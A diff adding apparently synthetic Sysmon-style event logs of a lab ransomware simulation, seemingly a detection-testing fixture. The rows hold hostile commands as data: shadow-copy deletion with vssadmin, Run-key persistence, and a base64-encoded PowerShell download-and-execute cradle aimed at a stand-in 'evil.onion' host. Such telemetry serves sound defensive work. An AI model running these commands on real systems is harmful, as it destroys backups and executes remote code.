@@ -1,0 +1,12 @@
+TimeCreated,EventID,Computer,Image,ParentImage,CommandLine,ParentCommandLine,User,TargetFilename,TargetObject,DestinationIp,DestinationPort,SourceImage,TargetImage,Hashes,Protocol,QueryName,Message
+2026-10-18T14:22:01.123Z,1,WIN10-LAB,C:\Samples\fake_ransom.exe,C:\Windows\System32\cmd.exe,"C:\Samples\fake_ransom.exe",cmd.exe /c start fake_ransom.exe,WIN10-LAB\Analyst,,,,,"",,SHA256=0515a0bdd746031b748c51edbd9dbbb6b98e468250587628b2c45ed544b87f24,,,"Process Create"
+2026-10-18T14:22:01.450Z,1,WIN10-LAB,C:\Windows\System32\cmd.exe,C:\Samples\fake_ransom.exe,"cmd.exe /c vssadmin delete shadows /all /quiet",C:\Samples\fake_ransom.exe,WIN10-LAB\Analyst,,,,,"",,,"",,"Process Create"
+2026-10-18T14:22:01.890Z,1,WIN10-LAB,C:\Windows\System32\vssadmin.exe,C:\Windows\System32\cmd.exe,"vssadmin delete shadows /all /quiet",cmd.exe /c vssadmin delete shadows /all /quiet,WIN10-LAB\Analyst,,,,,"",,,"",,"Process Create"
+2026-10-18T14:22:02.310Z,11,WIN10-LAB,C:\Samples\fake_ransom.exe,,,"",WIN10-LAB\Analyst,C:\Users\Analyst\Documents\report.docx.locked,,,,,,,,,"File Create"
+2026-10-18T14:22:02.340Z,11,WIN10-LAB,C:\Samples\fake_ransom.exe,,,"",WIN10-LAB\Analyst,C:\Users\Analyst\Documents\photos.zip.locked,,,,,,,,,"File Create"
+2026-10-18T14:22:02.380Z,11,WIN10-LAB,C:\Samples\fake_ransom.exe,,,"",WIN10-LAB\Analyst,C:\Users\Analyst\Desktop\notes.txt.locked,,,,,,,,,"File Create"
+2026-10-18T14:22:02.410Z,11,WIN10-LAB,C:\Samples\fake_ransom.exe,,,"",WIN10-LAB\Analyst,C:\Users\Analyst\Documents\database.mdb.locked,,,,,,,,,"File Create"
+2026-10-18T14:22:02.450Z,11,WIN10-LAB,C:\Samples\fake_ransom.exe,,,"",WIN10-LAB\Analyst,C:\Users\Analyst\Documents\README_DECRYPT.txt,,,,,,,,,"File Create"
+2026-10-18T14:22:03.100Z,13,WIN10-LAB,C:\Samples\fake_ransom.exe,,,"",WIN10-LAB\Analyst,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\FakeRansom,,,,,,,"Registry value set"
+2026-10-18T14:22:03.550Z,3,WIN10-LAB,C:\Samples\fake_ransom.exe,,,"",WIN10-LAB\Analyst,,,185.234.72.11,443,,,,"tcp",,"Network connection"
+2026-10-18T14:22:04.200Z,1,WIN10-LAB,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Samples\fake_ransom.exe,"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAG8AbgBpAG8AbgAvAHAAYQB5ACcAKQA=",C:\Samples\fake_ransom.exe,WIN10-LAB\Analyst,,,,,"",,,"",,"Process Create"
